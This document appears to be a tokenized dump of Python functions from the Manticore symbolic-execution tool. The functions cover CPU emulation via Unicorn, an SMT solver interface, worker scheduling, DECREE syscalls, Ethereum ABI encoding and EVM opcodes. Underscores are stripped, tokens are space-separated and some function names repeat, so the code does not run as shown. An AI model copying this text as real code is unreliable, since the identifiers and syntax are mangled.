MEM WRITE , self . hook xfer mem ) self . emu . hook add ( UC HOOK INTR , self . interrupt ) saved PC = self . cpu . PC try : pc = self . cpu . PC if self . cpu . arch == CS ARCH ARM and self . uc mode == UC MODE THUMB : pc |= 1 self . emu . emu start ( pc , self . cpu . PC + instruction . size , count = 1 ) except Uc Error as e : # We request re-execution by signaling error; if we we didn't set #  should try again, it was likely an actual error if not self . should try again : raise if self . should try again : return if logger . is Enabled For ( logging . DEBUG ) : logger . debug ( "=" * 10 ) for register in self . cpu . canonical registers : logger . debug ( f"Register {register:3s}  " f"Manticore: {self. cpu.read register(register):08x}, " f"Unicorn {self. emu.reg read(self. to unicorn id(register)):08x}" ) logger . debug ( ">" * 10 ) # Bring back Unicorn registers to Manticore for reg in registers : val = self . emu . reg read ( self . to unicorn id ( reg ) ) self . cpu . write register ( reg , val ) # Unicorn hack. On single step, unicorn wont advance the PC register mu pc = self . get unicorn pc ( ) if saved PC == mu pc : self . cpu . PC = saved PC + instruction . size # Raise the exception from a hook that Unicorn would have eaten if self . to raise : raise self . to raise return
def must be true ( self , constraints , expression ) -> bool : solutions = self . get all values ( constraints , expression , maxcnt = 2 , silent = True ) return solutions == [ True ]
def minmax ( self , constraints , x , iters = 10000 ) : if issymbolic ( x ) : m = self . min ( constraints , x , iters ) M = self . max ( constraints , x , iters ) return m , M else : return x , x
def start proc ( self ) : assert ' proc' not in dir ( self ) or self . proc is None try : self . proc = Popen ( shlex . split ( self . command ) , stdin = PIPE , stdout = PIPE , bufsize = 0 , universal newlines = True ) except OS Error as e : print ( e , "Probably too many cached expressions? visitors. cache..." ) # Z3 was removed from the system in the middle of operation raise Z3Not Found Error # TODO(mark) don't catch this exception in two places # run solver specific initializations for cfg in self . init : self . send ( cfg )
def reset ( self , constraints = None ) : if self . proc is None : self . start proc ( ) else : if self . support reset : self . send ( "(reset)" ) for cfg in self . init : self . send ( cfg ) else : self . stop proc ( ) self . start proc ( ) if constraints is not None : self . send ( constraints )
def recv ( self ) -> str : buf , left , right = self . readline and count ( ) bufl = [ buf ] while left != right : buf , l , r = self . readline and count ( ) bufl . append ( buf ) left += l right += r buf = '' . join ( bufl ) . strip ( ) logger . debug ( '<%s' , buf ) if '(error' in bufl [ 0 ] : raise Exception ( f"Error in smtlib: {bufl[0]}" ) return buf
def assert ( self , expression : Bool ) : assert isinstance ( expression , Bool ) smtlib = translate to smtlib ( expression ) self . send ( '(assert %s)' % smtlib )
def can be true ( self , constraints , expression ) : if isinstance ( expression , bool ) : if not expression : return expression else : # if True check if constraints are feasible self . reset ( constraints ) return self . is sat ( ) assert isinstance ( expression , Bool ) with constraints as temp cs : temp cs . add ( expression ) self . reset ( temp cs . to string ( related to = expression ) ) return self . is sat ( )
def get all values ( self , constraints , expression , maxcnt = None , silent = False ) : if not isinstance ( expression , Expression ) : return [ expression ] assert isinstance ( constraints , Constraint Set ) assert isinstance ( expression , Expression ) expression = simplify ( expression ) if maxcnt is None : maxcnt = consts . maxsolutions with constraints as temp cs : if isinstance ( expression , Bool ) : var = temp cs . new bool ( ) elif isinstance ( expression , Bit Vec ) : var = temp cs . new bitvec ( expression . size ) elif isinstance ( expression , Array ) : var = temp cs . new array ( index max = expression . index max , value bits = expression . value bits , taint = expression . taint ) . array else : raise Not Implemented Error ( f"get all values only implemented for {type(expression)} expression type." ) temp cs . add ( var == expression ) self . reset ( temp cs . to string ( related to = var ) ) result = [ ] while self . is sat ( ) : value = self . getvalue ( var ) result . append ( value ) self . assert ( var != value ) if len ( result ) >= maxcnt : if silent : # do not throw an exception if set to silent # Default is not silent, assume user knows # what they are doing and will check the size # of returned vals list (previous smtlib behavior) break else : raise Too Many Solutions ( result ) return result
def get value ( self , constraints , expression ) : if not issymbolic ( expression ) : return expression assert isinstance ( expression , ( Bool , Bit Vec , Array ) ) with constraints as temp cs : if isinstance ( expression , Bool ) : var = temp cs . new bool ( ) elif isinstance ( expression , Bit Vec ) : var = temp cs . new bitvec ( expression . size ) elif isinstance ( expression , Array ) : var = [ ] result = [ ] for i in range ( expression . index max ) : subvar = temp cs . new bitvec ( expression . value bits ) var . append ( subvar ) temp cs . add ( subvar == simplify ( expression [ i ] ) ) self . reset ( temp cs ) if not self . is sat ( ) : raise Solver Error ( 'Model is not available' ) for i in range ( expression . index max ) : self . send ( '(get-value (%s))' % var [ i ] . name ) ret = self . recv ( ) assert ret . startswith ( '((' ) and ret . endswith ( '))' ) pattern , base = self . get value fmt m = pattern . match ( ret ) expr , value = m . group ( 'expr' ) , m . group ( 'value' ) result . append ( int ( value , base ) ) return bytes ( result ) temp cs . add ( var == expression ) self . reset ( temp cs ) if not self . is sat ( ) : raise Solver Error ( 'Model is not available' ) self . send ( '(get-value (%s))' % var . name ) ret = self . recv ( ) if not ( ret . startswith ( '((' ) and ret . endswith ( '))' ) ) : raise Solver Error ( 'SMTLIB error parsing response: %s' % ret ) if isinstance ( expression , Bool ) : return { 'true' : True , 'false' : False } [ ret [ 2 : - 2 ] . split ( ' ' ) [ 1 ] ] if isinstance ( expression , Bit Vec ) : pattern , base = self . get value fmt m = pattern . match ( ret ) expr , value = m . group ( 'expr' ) , m . group ( 'value' ) return int ( value , base ) raise Not Implemented Error ( "get value only implemented for Bool and Bit Vec" )
def colored level name ( self , levelname ) : if self . colors disabled : return self . plain levelname format . format ( levelname ) else : return self . colored levelname format . format ( self . color map [ levelname ] , levelname )
def all events ( cls ) : all evts = set ( ) for cls , evts in cls . all events . items ( ) : all evts . update ( evts ) return all evts
def forward events to ( self , sink , include source = False ) : assert isinstance ( sink , Eventful ) , f'{sink. class . name } is not Eventful' self . forwards [ sink ] = include source
def context ( self ) : if self . context is not None : return self . context else : logger . warning ( "Using shared context without a lock" ) return self . executor . shared context
def locked context ( self , key = None , default = dict ) : keys = [ 'policy' ] if key is not None : keys . append ( key ) with self . executor . locked context ( '.' . join ( keys ) , default ) as policy context : yield policy context
def visited callback ( self , state , pc , instr ) : with self . locked context ( 'visited' , set ) as ctx : ctx . add ( pc )
def visited callback ( self , state , pc , instr ) : pc = state . platform . current . PC with self . locked context ( 'visited' , dict ) as ctx : ctx [ pc ] = ctx . get ( pc , 0 ) + 1
def put ( self , state id ) : self . states . append ( state id ) self . lock . notify all ( ) return state id
def get ( self ) : # A shutdown has been requested if self . is shutdown ( ) : return None # if not more states in the queue, let's wait for some forks while len ( self . states ) == 0 : # if no worker is running, bail out if self . running == 0 : return None # if a shutdown has been requested, bail out if self . is shutdown ( ) : return None # if there ares actually some workers running, wait for state forks logger . debug ( "Waiting for available states" ) self . lock . wait ( ) state id = self . policy . choice ( list ( self . states ) ) if state id is None : return None del self . states [ self . states . index ( state id ) ] return state id
def run ( self ) : # policy order=self.policy order # policy=self.policy current state = None current state id = None with With Keyboard Interrupt As ( self . shutdown ) : # notify siblings we are about to start a run self . notify start run ( ) logger . debug ( "Starting Manticore Symbolic Emulator Worker (pid %d)." , os . getpid ( ) ) solver = Z3Solver ( ) while not self . is shutdown ( ) : try : # handle fatal errors: exceptions in Manticore try : # handle external (e.g. solver) errors, and executor control exceptions # select a suitable state to analyze if current state is None : with self . lock : # notify siblings we are about to stop this run self . notify stop run ( ) try : # Select a single state id current state id = self . get ( ) # load selected state from secondary storage if current state id is not None : self . publish ( 'will load state' , current state id ) current state = self . workspace . load state ( current state id ) self . forward events from ( current state , True ) self . publish ( 'did load state' , current state , current state id ) logger . info ( "load state %r" , current state id ) # notify siblings we have a state to play with finally : self . notify start run ( ) # If current state is still None. We are done. if current state is None : logger . debug ( "No more states in the queue, byte bye!" ) break assert current state is not None assert current state . constraints is current state . platform . constraints # Allows to terminate manticore worker on user request while not self . is shutdown ( ) : if not current state . execute ( ) : break else : # Notify this worker is done self . publish ( 'will terminate state' , current state , current state id , Terminate State ( 'Shutdown' ) ) current state = None # Handling Forking and terminating exceptions except Concretize as e : # expression # policy # setstate() logger . debug ( "Generic state fork on condition" ) current state = self . fork ( current state , e . expression , e . policy , e . setstate ) except Terminate State as e : # Notify this worker is done self . publish ( 'will terminate state' , current state , current state id , e ) logger . debug ( "Generic terminate state" ) if e . testcase : self . publish ( 'internal generate testcase' , current state , message = str ( e ) ) current state = None except Solver Error as e : # raise import traceback trace = traceback . format exc ( ) logger . error ( "Exception: %s\n%s" , str ( e ) , trace ) # Notify this state is done self . publish ( 'will terminate state' , current state , current state id , e ) if solver . check ( current state . constraints ) : self . publish ( 'internal generate testcase' , current state , message = "Solver failed" + str ( e ) ) current state = None except ( Exception , Assertion Error ) as e : # raise import traceback trace = traceback . format exc ( ) logger . error ( "Exception: %s\n%s" , str ( e ) , trace ) # Notify this worker is done self . publish ( 'will terminate state' , current state , current state id , e ) current state = None assert current state is None or self . is shutdown ( ) # notify siblings we are about to stop this run self . notify stop run ( )
def hook callback ( self , state , pc , instruction ) : # Ignore symbolic pc. # TODO(yan): Should we ask the solver if any of the hooks are possible, # and execute those that are? if issymbolic ( pc ) : return # Invoke all pc-specific hooks for cb in self . hooks . get ( pc , [ ] ) : cb ( state ) # Invoke all pc-agnostic hooks for cb in self . hooks . get ( None , [ ] ) : cb ( state )
def get group ( name : str ) -> Group : global groups if name in groups : return groups [ name ] group = Group ( name ) groups [ name ] = group return group
def get description ( self , name : str ) -> str : if name not in self . vars : raise Config Error ( f"{self.name}.{name} not defined." ) return self . vars [ name ] . description
def correspond ( text ) : subproc . stdin . write ( text ) subproc . stdin . flush ( ) return drain ( )
def get constructor arguments ( self ) -> str : item = self . constructor abi item return '()' if item is None else self . tuple signature for components ( item [ 'inputs' ] )
def hashes ( self ) -> Tuple [ bytes , ... ] : selectors = self . function signatures by selector . keys ( ) return ( * selectors , self . fallback function selector )
def map memory callback ( self , address , size , perms , name , offset , result ) : logger . info ( ' ' . join ( ( "Mapping Memory @" , hex ( address ) if type ( address ) is int else "0x??" , hr size ( size ) , "-" , perms , "-" , f"{name}:{hex(offset) if name else ''}" , "->" , hex ( result ) ) ) ) self . emu . mem map ( address , size , convert permissions ( perms ) ) self . copy memory ( address , size )
def unmap memory callback ( self , start , size ) : logger . info ( f"Unmapping memory from {hex(start)} to {hex(start + size)}" ) mask = ( 1 << 12 ) - 1 if ( start & mask ) != 0 : logger . error ( "Memory to be unmapped is not aligned to a page" ) if ( size & mask ) != 0 : size = ( ( size >> 12 ) + 1 ) << 12 logger . warning ( "Forcing unmap size to align to a page" ) self . emu . mem unmap ( start , size )
def protect memory callback ( self , start , size , perms ) : logger . info ( f"Changing permissions on {hex(start)}:{hex(start + size)} to {perms}" ) self . emu . mem protect ( start , size , convert permissions ( perms ) )
def hook syscall ( self , uc , data ) : logger . debug ( f"Stopping emulation at {hex(uc.reg read(self. to unicorn id('RIP')))} to perform syscall" ) self . sync unicorn to manticore ( ) from . . native . cpu . abstractcpu import Syscall self . to raise = Syscall ( ) uc . emu stop ( )
def hook write mem ( self , uc , access , address , size , value , data ) : self . mem delta [ address ] = ( value , size ) return True
def hook unmapped ( self , uc , access , address , size , value , data ) : try : self . sync unicorn to manticore ( ) logger . warning ( f"Encountered an operation on unmapped memory at {hex(address)}" ) m = self . cpu . memory . map containing ( address ) self . copy memory ( m . start , m . end - m . start ) except Memory Exception as e : logger . error ( "Failed to map memory {}-{}, ({}): {}" . format ( hex ( address ) , hex ( address + size ) , access , e ) ) self . to raise = e self . should try again = False return False self . should try again = True return False
def emulate ( self , instruction ) : # The emulation might restart if Unicorn needs to bring in a memory map # or bring a value from Manticore state. while True : # Try emulation self . should try again = False self . to raise = None self . step ( instruction ) if not self . should try again : break
def sync unicorn to manticore ( self ) : self . write backs disabled = True for reg in self . registers : val = self . emu . reg read ( self . to unicorn id ( reg ) ) self . cpu . write register ( reg , val ) if len ( self . mem delta ) > 0 : logger . debug ( f"Syncing {len(self. mem delta)} writes back into Manticore" ) for location in self . mem delta : value , size = self . mem delta [ location ] self . cpu . write int ( location , value , size * 8 ) self . write backs disabled = False self . mem delta = { }
def write back memory ( self , where , expr , size ) : if self . write backs disabled : return if type ( expr ) is bytes : self . emu . mem write ( where , expr ) else : if issymbolic ( expr ) : data = [ Operators . CHR ( Operators . EXTRACT ( expr , offset , 8 ) ) for offset in range ( 0 , size , 8 ) ] concrete data = [ ] for c in data : if issymbolic ( c ) : c = chr ( solver . get value ( self . cpu . memory . constraints , c ) ) concrete data . append ( c ) data = concrete data else : data = [ Operators . CHR ( Operators . EXTRACT ( expr , offset , 8 ) ) for offset in range ( 0 , size , 8 ) ] logger . debug ( f"Writing back {hr size(size // 8)} to {hex(where)}: {data}" ) # TODO - the extra encoding is to handle null bytes output as strings when we concretize. That's probably a bug. self . emu . mem write ( where , b'' . join ( b . encode ( 'utf-8' ) if type ( b ) is str else b for b in data ) )
def update segment ( self , selector , base , size , perms ) : logger . info ( "Updating selector %s to 0x%02x (%s bytes) (%s)" , selector , base , size , perms ) if selector == 99 : self . set fs ( base ) else : logger . error ( "No way to write segment: %d" , selector )
def deprecated ( message : str ) : assert isinstance ( message , str ) , "The deprecated decorator requires a message string argument." def decorator ( func ) : @ wraps ( func ) def wrapper ( * args , * * kwargs ) : warnings . warn ( f"`{func. qualname }` is deprecated. {message}" , category = Manticore Deprecation Warning , stacklevel = 2 ) return func ( * args , * * kwargs ) return wrapper return decorator
def input from cons ( constupl , datas ) : def make chr ( c ) : try : return chr ( c ) except Exception : return c newset = constraints to constraintset ( constupl ) ret = '' for data in datas : for c in data : ret += make chr ( solver . get value ( newset , c ) ) return ret
def write ( self , data ) : size = min ( len ( data ) , self . max size - self . pos ) for i in range ( self . pos , self . pos + size ) : self . array [ i ] = data [ i - self . pos ]
def sys fsync ( self , fd ) : ret = 0 try : self . files [ fd ] . sync ( ) except Index Error : ret = - errno . EBADF except Fd Error : ret = - errno . EINVAL return ret
def awake ( self , procid ) : logger . debug ( f"Remove procid:{procid} from waitlists and reestablish it in the running list" ) for wait list in self . rwait : if procid in wait list : wait list . remove ( procid ) for wait list in self . twait : if procid in wait list : wait list . remove ( procid ) self . timers [ procid ] = None self . running . append ( procid ) if self . current is None : self . current = procid
def signal receive ( self , fd ) : connections = self . connections if connections ( fd ) and self . twait [ connections ( fd ) ] : procid = random . sample ( self . twait [ connections ( fd ) ] , 1 ) [ 0 ] self . awake ( procid )
def signal transmit ( self , fd ) : connection = self . connections ( fd ) if connection is None or connection >= len ( self . rwait ) : return procs = self . rwait [ connection ] if procs : procid = random . sample ( procs , 1 ) [ 0 ] self . awake ( procid )
def check timers ( self ) : if self . current is None : # Advance the clocks. Go to future!! advance = min ( [ self . clocks ] + [ x for x in self . timers if x is not None ] ) + 1 logger . debug ( f"Advancing the clock from {self.clocks} to {advance}" ) self . clocks = advance for procid in range ( len ( self . timers ) ) : if self . timers [ procid ] is not None : if self . clocks > self . timers [ procid ] : self . procs [ procid ] . PC += self . procs [ procid ] . instruction . size self . awake ( procid )
def sys fdwait ( self , cpu , nfds , readfds , writefds , timeout , readyfds ) : logger . debug ( "FDWAIT(%d, 0x%08x, 0x%08x, 0x%08x, 0x%08x)" % ( nfds , readfds , writefds , timeout , readyfds ) ) if timeout : if timeout not in cpu . memory : # todo: size logger . info ( "FDWAIT: timeout is pointing to invalid memory. Returning EFAULT" ) return Decree . CGC EFAULT if readyfds : if readyfds not in cpu . memory : logger . info ( "FDWAIT: readyfds pointing to invalid memory. Returning EFAULT" ) return Decree . CGC EFAULT writefds wait = set ( ) writefds ready = set ( ) fds bitsize = ( nfds + 7 ) & ~ 7 if writefds : if writefds not in cpu . memory : logger . info ( "FDWAIT: writefds pointing to invalid memory. Returning EFAULT" ) return Decree . CGC EFAULT bits = cpu . read int ( writefds , fds bitsize ) for fd in range ( nfds ) : if ( bits & 1 << fd ) : if self . files [ fd ] . is full ( ) : writefds wait . add ( fd ) else : writefds ready . add ( fd ) readfds wait = set ( ) readfds ready = set ( ) if readfds : if readfds not in cpu . memory : logger . info ( "FDWAIT: readfds pointing to invalid memory. Returning EFAULT" ) return Decree . CGC EFAULT bits = cpu . read int ( readfds , fds bitsize ) for fd in range ( nfds ) : if ( bits & 1 << fd ) : if self . files [ fd ] . is empty ( ) : readfds wait . add ( fd ) else : readfds ready . add ( fd ) n = len ( readfds ready ) + len ( writefds ready ) if n == 0 : # TODO FIX timeout symbolic if timeout != 0 : seconds = cpu . read int ( timeout , 32 ) microseconds = cpu . read int ( timeout + 4 , 32 ) logger . info ( "FDWAIT: waiting for read on fds: {%s} and write to: {%s} timeout: %d" , repr ( list ( readfds wait ) ) , repr ( list ( writefds wait ) ) , microseconds + 1000 * seconds ) to = microseconds + 1000 * seconds # no ready file, wait else : to = None logger . info ( "FDWAIT: waiting for read on fds: {%s} and write to: {%s} timeout: INDIFENITELY" , repr ( list ( readfds wait ) ) , repr ( list ( writefds wait ) ) ) cpu . PC -= cpu . instruction . size self . wait ( readfds wait , writefds wait , to ) raise Restart Syscall ( ) # When coming back from a timeout remember # not to backtrack instruction and set EAX to 0! :( ugliness alert! if readfds : bits = 0 for fd in readfds ready : bits |= 1 << fd for byte in range ( 0 , nfds , 8 ) : cpu . write int ( readfds , ( bits >> byte ) & 0xff , 8 ) if writefds : bits = 0 for fd in writefds ready : bits |= 1 << fd for byte in range ( 0 , nfds , 8 ) : cpu . write int ( writefds , ( bits >> byte ) & 0xff , 8 ) logger . info ( "FDWAIT: continuing. Some file is ready Readyfds: %08x" , readyfds ) if readyfds : cpu . write int ( readyfds , n , 32 ) self . syscall trace . append ( ( " fdwait" , - 1 , None ) ) return 0
def signal transmit ( self , fd ) : connections = self . connections if connections ( fd ) and self . rwait [ connections ( fd ) ] : procid = random . sample ( self . rwait [ connections ( fd ) ] , 1 ) [ 0 ] self . awake ( procid )
def sys receive ( self , cpu , fd , buf , count , rx bytes ) : if issymbolic ( fd ) : logger . info ( "Ask to read from a symbolic file descriptor!!" ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 0 ) if issymbolic ( buf ) : logger . info ( "Ask to read to a symbolic buffer" ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 1 ) if issymbolic ( count ) : logger . info ( "Ask to read a symbolic number of bytes " ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 2 ) if issymbolic ( rx bytes ) : logger . info ( "Ask to return size to a symbolic address " ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 3 ) return super ( ) . sys receive ( cpu , fd , buf , count , rx bytes )
def sys transmit ( self , cpu , fd , buf , count , tx bytes ) : if issymbolic ( fd ) : logger . info ( "Ask to write to a symbolic file descriptor!!" ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 0 ) if issymbolic ( buf ) : logger . info ( "Ask to write to a symbolic buffer" ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 1 ) if issymbolic ( count ) : logger . info ( "Ask to write a symbolic number of bytes " ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 2 ) if issymbolic ( tx bytes ) : logger . info ( "Ask to return size to a symbolic address " ) cpu . PC = cpu . PC - cpu . instruction . size raise Symbolic Syscall Argument ( cpu , 3 ) return super ( ) . sys transmit ( cpu , fd , buf , count , tx bytes )
def visit Operation ( self , expression , * operands ) : operation = self . operations . get ( type ( expression ) , None ) if operation is not None and all ( isinstance ( o , Constant ) for o in operands ) : value = operation ( * ( x . value for x in operands ) ) if isinstance ( expression , Bit Vec ) : return Bit Vec Constant ( expression . size , value , taint = expression . taint ) else : isinstance ( expression , Bool ) return Bool Constant ( value , taint = expression . taint ) else : if any ( operands [ i ] is not expression . operands [ i ] for i in range ( len ( operands ) ) ) : expression = self . rebuild ( expression , operands ) return expression
def visit Operation ( self , expression , * operands ) : if all ( isinstance ( o , Constant ) for o in operands ) : expression = constant folder ( expression ) if self . changed ( expression , operands ) : expression = self . rebuild ( expression , operands ) return expression
def type size ( ty ) : if ty [ 0 ] in ( 'int' , 'uint' , 'bytes M' , 'function' ) : return 32 elif ty [ 0 ] in ( 'tuple' ) : result = 0 for ty i in ty [ 1 ] : result += ABI . type size ( ty i ) return result elif ty [ 0 ] in ( 'array' ) : rep = ty [ 1 ] result = 32 # offset link return result elif ty [ 0 ] in ( 'bytes' , 'string' ) : result = 32 # offset link return result raise Value Error
def function call ( type spec , * args ) : m = re . match ( r"(?P<name>[a-z A-Z ][a-z A-Z 0-9]*)(?P<type>\(.*\))" , type spec ) if not m : raise Ethereum Error ( "Function signature expected" ) ABI . check and warn num args ( type spec , * args ) result = ABI . function selector ( type spec ) # Funcid result += ABI . serialize ( m . group ( 'type' ) , * args ) return result
def function selector ( method name and signature ) : s = sha3 . keccak 256 ( ) s . update ( method name and signature . encode ( ) ) return bytes ( s . digest ( ) [ : 4 ] )
def serialize uint ( value , size = 32 , padding = 0 ) : if size <= 0 or size > 32 : raise Value Error from . account import EVM Account # because of circular import if not isinstance ( value , ( int , Bit Vec , EVM Account ) ) : raise Value Error if issymbolic ( value ) : # FIXME This temporary array variable should be obtained from a specific constraint store bytes = Array Variable ( index bits = 256 , index max = 32 , value bits = 8 , name = 'temp{}' . format ( uuid . uuid1 ( ) ) ) if value . size <= size * 8 : value = Operators . ZEXTEND ( value , size * 8 ) else : # automatically truncate, e.g. if they passed a Bit Vec(256) for an `address` argument (160 bits) value = Operators . EXTRACT ( value , 0 , size * 8 ) bytes = Array Proxy ( bytes . write BE ( padding , value , size ) ) else : value = int ( value ) bytes = bytearray ( ) for in range ( padding ) : bytes . append ( 0 ) for position in reversed ( range ( size ) ) : bytes . append ( Operators . EXTRACT ( value , position * 8 , 8 ) ) assert len ( bytes ) == size + padding return bytes
def serialize int ( value , size = 32 , padding = 0 ) : if size <= 0 or size > 32 : raise Value Error if not isinstance ( value , ( int , Bit Vec ) ) : raise Value Error if issymbolic ( value ) : buf = Array Variable ( index bits = 256 , index max = 32 , value bits = 8 , name = 'temp{}' . format ( uuid . uuid1 ( ) ) ) value = Operators . SEXTEND ( value , value . size , size * 8 ) buf = Array Proxy ( buf . write BE ( padding , value , size ) ) else : value = int ( value ) buf = bytearray ( ) for in range ( padding ) : buf . append ( 0 ) for position in reversed ( range ( size ) ) : buf . append ( Operators . EXTRACT ( value , position * 8 , 8 ) ) return buf
def instruction ( self ) : # FIXME check if pc points to invalid instruction # if self.pc >= len(self.bytecode): #    return Invalid Opcode('Code out of range') # if self.pc in self.invalid: #    raise Invalid Opcode('Opcode inside a PUSH immediate') try : decoding cache = getattr ( self , ' decoding cache' ) except Exception : decoding cache = self . decoding cache = { } pc = self . pc if isinstance ( pc , Constant ) : pc = pc . value if pc in decoding cache : return decoding cache [ pc ] def getcode ( ) : bytecode = self . bytecode for pc i in range ( pc , len ( bytecode ) ) : yield simplify ( bytecode [ pc i ] ) . value while True : yield 0 instruction = EVM Asm . disassemble one ( getcode ( ) , pc = pc , fork = DEFAULT FORK ) decoding cache [ pc ] = instruction return instruction
def top ( self , n = 0 ) : if len ( self . stack ) - n < 0 : raise Stack Underflow ( ) return self . stack [ n - 1 ]
def rollback ( self ) : last pc , last gas , last instruction , last arguments , fee , allocated = self . checkpoint data self . push arguments ( last arguments ) self . gas = last gas self . pc = last pc self . allocated = allocated self . checkpoint data = None
def store ( self , offset , value , size = 1 ) : self . memory . write BE ( offset , value , size ) for i in range ( size ) : self . publish ( 'did evm write memory' , offset + i , Operators . EXTRACT ( value , ( size - i - 1 ) * 8 , 8 ) )
def SMOD ( self , a , b ) : s0 , s1 = to signed ( a ) , to signed ( b ) sign = Operators . ITEBV ( 256 , s0 < 0 , - 1 , 1 ) try : result = ( Operators . ABS ( s0 ) % Operators . ABS ( s1 ) ) * sign except Zero Division Error : result = 0 return Operators . ITEBV ( 256 , s1 == 0 , 0 , result )
def EXP gas ( self , base , exponent ) : EXP SUPPLEMENTAL GAS = 10 # cost of EXP exponent per byte def nbytes ( e ) : result = 0 for i in range ( 32 ) : result = Operators . ITEBV ( 512 , Operators . EXTRACT ( e , i * 8 , 8 ) != 0 , i + 1 , result ) return result return EXP SUPPLEMENTAL GAS * nbytes ( exponent )
def SIGNEXTEND ( self , size , value ) : # FIXME maybe use Operators.SEXTEND testbit = Operators . ITEBV ( 256 , size <= 31 , size * 8 + 7 , 257 ) result1 = ( value | ( TT256 - ( 1 << testbit ) ) ) result2 = ( value & ( ( 1 << testbit ) - 1 ) ) result = Operators . ITEBV ( 256 , ( value & ( 1 << testbit ) ) != 0 , result1 , result2 ) return Operators . ITEBV ( 256 , size <= 31 , result , value )
def LT ( self , a , b ) : return Operators . ITEBV ( 256 , Operators . ULT ( a , b ) , 1 , 0 )
def GT ( self , a , b ) : return Operators . ITEBV ( 256 , Operators . UGT ( a , b ) , 1 , 0 )
def SGT ( self , a , b ) : # http://gavwood.com/paper.pdf s0 , s1 = to signed ( a ) , to signed ( b ) return Operators . ITEBV ( 256 , s0 > s1 , 1 , 0 )
def BYTE ( self , offset , value ) : offset = Operators . ITEBV ( 256 , offset < 32 , ( 31 - offset ) * 8 , 256 ) return Operators . ZEXTEND ( Operators . EXTRACT ( value , offset , 8 ) , 256 )
def SHA3 ( self , start , size ) : # read memory from start to end # http://gavwood.com/paper.pdf data = self . try simplify to constant ( self . read buffer ( start , size ) ) if issymbolic ( data ) : known sha3 = { } # Broadcast the signal self . publish ( 'on symbolic sha3' , data , known sha3 ) # This updates the local copy of sha3 with the pairs we need to explore value = 0 # never used known hashes cond = False for key , hsh in known sha3 . items ( ) : assert not issymbolic ( key ) , "Saved sha3 data,hash pairs should be concrete" cond = key == data known hashes cond = Operators . OR ( cond , known hashes cond ) value = Operators . ITEBV ( 256 , cond , hsh , value ) return value value = sha3 . keccak 256 ( data ) . hexdigest ( ) value = int ( value , 16 ) self . publish ( 'on concrete sha3' , data , value ) logger . info ( "Found a concrete SHA3 example %r -> %x" , data , value ) return value
def CALLDATALOAD ( self , offset ) : if issymbolic ( offset ) : if solver . can be true ( self . constraints , offset == self . used calldata size ) : self . constraints . add ( offset == self . used calldata size ) raise Concretize Argument ( 1 , policy = 'SAMPLED' ) self . use calldata ( offset , 32 ) data length = len ( self . data ) bytes = [ ] for i in range ( 32 ) : try : c = Operators . ITEBV ( 8 , offset + i < data length , self . data [ offset + i ] , 0 ) except Index Error : # offset + i is concrete and outside data c = 0 bytes . append ( c ) return Operators . CONCAT ( 256 , * bytes )
def CALLDATACOPY ( self , mem offset , data offset , size ) : if issymbolic ( size ) : if solver . can be true ( self . constraints , size <= len ( self . data ) + 32 ) : self . constraints . add ( size <= len ( self . data ) + 32 ) raise Concretize Argument ( 3 , policy = 'SAMPLED' ) if issymbolic ( data offset ) : if solver . can be true ( self . constraints , data offset == self . used calldata size ) : self . constraints . add ( data offset == self . used calldata size ) raise Concretize Argument ( 2 , policy = 'SAMPLED' ) #account for calldata usage self . use calldata ( data offset , size ) self . allocate ( mem offset , size ) for i in range ( size ) : try : c = Operators . ITEBV ( 8 , data offset + i < len ( self . data ) , Operators . ORD ( self . data [ data offset + i ] ) , 0 ) except Index Error : # data offset + i is concrete and outside data c = 0 self . store ( mem offset + i , c )
def CODECOPY ( self , mem offset , code offset , size ) : self . allocate ( mem offset , size ) GCOPY = 3 # cost to copy one 32 byte word copyfee = self . safe mul ( GCOPY , Operators . UDIV ( self . safe add ( size , 31 ) , 32 ) ) self . consume ( copyfee ) if issymbolic ( size ) : max size = solver . max ( self . constraints , size ) else : max size = size for i in range ( max size ) : if issymbolic ( i < size ) : default = Operators . ITEBV ( 8 , i < size , 0 , self . load ( mem offset + i , 1 ) ) # Fixme. unnecessary memory read else : if i < size : default = 0 else : default = self . load ( mem offset + i , 1 ) if issymbolic ( code offset ) : value = Operators . ITEBV ( 8 , code offset + i >= len ( self . bytecode ) , default , self . bytecode [ code offset + i ] ) else : if code offset + i >= len ( self . bytecode ) : value = default else : value = self . bytecode [ code offset + i ] self . store ( mem offset + i , value ) self . publish ( 'did evm read code' , code offset , size )
def EXTCODECOPY ( self , account , address , offset , size ) : extbytecode = self . world . get code ( account ) self . allocate ( address + size ) for i in range ( size ) : if offset + i < len ( extbytecode ) : self . store ( address + i , extbytecode [ offset + i ] ) else : self . store ( address + i , 0 )
def MLOAD ( self , address ) : self . allocate ( address , 32 ) value = self . load ( address , 32 ) return value
def MSTORE ( self , address , value ) : if istainted ( self . pc ) : for taint in get taints ( self . pc ) : value = taint with ( value , taint ) self . allocate ( address , 32 ) self . store ( address , value , 32 )
def MSTORE8 ( self , address , value ) : if istainted ( self . pc ) : for taint in get taints ( self . pc ) : value = taint with ( value , taint ) self . allocate ( address , 1 ) self . store ( address , Operators . EXTRACT ( value , 0 , 8 ) , 1 )
def SLOAD ( self , offset ) : storage address = self . address self . publish ( 'will evm read storage' , storage address , offset ) value = self . world . get storage data ( storage address , offset ) self . publish ( 'did evm read storage' , storage address , offset , value ) return value
def SSTORE ( self , offset , value ) : storage address = self . address self . publish ( 'will evm write storage' , storage address , offset , value ) #refund = Operators.ITEBV(256, #                         previous value != 0, #                         Operators.ITEBV(256, value != 0, 0, GSTORAGEREFUND), #                         0) if istainted ( self . pc ) : for taint in get taints ( self . pc ) : value = taint with ( value , taint ) self . world . set storage data ( storage address , offset , value ) self . publish ( 'did evm write storage' , storage address , offset , value )
def JUMPI ( self , dest , cond ) : self . pc = Operators . ITEBV ( 256 , cond != 0 , dest , self . pc + self . instruction . size ) #This set ups a check for JMPDEST in the next instruction if cond != 0 self . set check jmpdest ( cond != 0 )
def SWAP ( self , * operands ) : a = operands [ 0 ] b = operands [ - 1 ] return ( b , ) + operands [ 1 : - 1 ] + ( a , )
